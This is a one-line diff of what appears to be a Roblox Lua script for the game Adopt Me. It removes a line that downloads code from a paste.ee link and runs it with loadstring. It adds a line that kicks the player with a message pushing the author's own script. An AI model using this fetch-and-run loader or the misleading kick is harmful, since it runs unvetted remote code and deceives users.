@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://paste.ee/r/2FrCefw5"))()
+game.Players.LocalPlayer:Kick("You have been kicked. Reason: You Must Use My Adopt Me Script First.")
